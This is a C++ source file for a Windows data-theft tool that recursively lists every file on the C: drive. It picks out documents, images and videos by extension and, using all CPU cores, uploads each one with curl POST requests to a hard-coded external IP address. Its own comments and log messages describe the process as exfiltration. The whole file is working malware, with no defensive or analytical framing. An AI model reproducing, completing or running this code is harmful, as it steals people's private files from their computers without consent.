#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <cstdlib>
#include <sstream>
#include <thread>
#include <mutex>
#include <queue>
#include <condition_variable>
//g++ -o Data9.exe main.cpp -static -std=c++17 -lws2_32
// Mutex for thread safety
std::mutex exfilMutex;
std::condition_variable cv;
std::queue<std::string> fileQueue;
bool doneGathering = false;

// File priority groups
std::vector<std::string> textExtensions = {".txt", ".doc", ".docx"};
std::vector<std::string> imageExtensions = {".png", ".jpg", ".jpeg"};
std::vector<std::string> videoExtensions = {".mp4", ".avi", ".mkv"};

// Function to check if a file matches extensions
bool hasExtension(const std::string& filePath, const std::vector<std::string>& extensions) {
    for (const auto& ext : extensions) {
        if (filePath.size() >= ext.size() &&
            filePath.compare(filePath.size() - ext.size(), ext.size(), ext) == 0) {
            return true;
        }
    }
    return false;
}

// Function to run a CMD command and capture output
std::vector<std::string> runCommand(const std::string& command) {
    std::vector<std::string> result;
    FILE* pipe = _popen(command.c_str(), "r");

    if (!pipe) {
        std::cerr << "[ERROR] Failed to run command: " << command << std::endl;
        return result;
    }

    char buffer[4096];
    while (fgets(buffer, sizeof(buffer), pipe)) {
        std::string line(buffer);
        line.erase(line.find_last_not_of("\r\n") + 1); // Trim newlines
        result.push_back(line);
    }

    _pclose(pipe);
    return result;
}

// Function to recursively list files in a directory using CMD
void gatherFiles(const std::string& directoryPath, const std::vector<std::string>& extensions) {
    try {
        std::string command = "cmd /c dir /s /b \"" + directoryPath + "\" 2>nul"; // Redirect errors to null
        std::vector<std::string> files = runCommand(command);

        {
            std::lock_guard<std::mutex> lock(exfilMutex);
            for (const auto& file : files) {
                if (hasExtension(file, extensions)) {
                    fileQueue.push(file);
                }
            }
        }
        cv.notify_all();
    } catch (const std::exception& e) {
        std::cerr << "[ERROR] Exception during file gathering: " << e.what() << std::endl;
    }
}

// Function to exfiltrate a single file using CURL
void exfiltrateFile(const std::string& targetURL) {
    while (true) {
        std::string filePath;
        {
            std::unique_lock<std::mutex> lock(exfilMutex);
            cv.wait(lock, [] { return !fileQueue.empty() || doneGathering; });

            if (fileQueue.empty() && doneGathering) {
                break;
            }

            filePath = fileQueue.front();
            fileQueue.pop();
        }

        std::cout << "[INFO] Exfiltrating file: " << filePath << std::endl;

        std::ostringstream command;
        command << "curl -X POST -F \"file=@" << filePath << "\" " << targetURL;

        int result = std::system(command.str().c_str());

        if (result == 0) {
            std::cout << "[SUCCESS] File exfiltrated: " << filePath << std::endl;
        } else {
            std::cerr << "[ERROR] Failed to exfiltrate file: " << filePath << std::endl;
        }
    }
}

// Process files based on priority with multithreading
void processFilesMultithreaded(const std::string& directoryPath, const std::vector<std::string>& extensions, const std::string& targetURL, int threadCount) {
    // Start file gathering in a separate thread
    std::thread gatherer(gatherFiles, directoryPath, extensions);

    // Start exfiltration threads
    std::vector<std::thread> workers;
    for (int i = 0; i < threadCount; ++i) {
        workers.emplace_back(exfiltrateFile, targetURL);
    }

    gatherer.join(); // Wait for the file gathering to complete
    {
        std::lock_guard<std::mutex> lock(exfilMutex);
        doneGathering = true;
    }
    cv.notify_all(); // Notify all workers to finish

    for (auto& worker : workers) {
        if (worker.joinable()) {
            worker.join();
        }
    }
}

int main() {
    std::string directoryPath = "C:\\";                  // Starting directory
    std::string targetURL = "http://64.94.85.32:7000"; // Replace with your server URL
    int threadCount = std::thread::hardware_concurrency();    // Use all available cores

    std::cout << "[INFO] Starting recursive file exfiltration process with " << threadCount << " threads..." << std::endl;

    // Process files in priority order
    processFilesMultithreaded(directoryPath, textExtensions, targetURL, threadCount);
    processFilesMultithreaded(directoryPath, imageExtensions, targetURL, threadCount);
    processFilesMultithreaded(directoryPath, videoExtensions, targetURL, threadCount);

    std::cout << "[INFO] File exfiltration process completed." << std::endl;
    return 0;
}
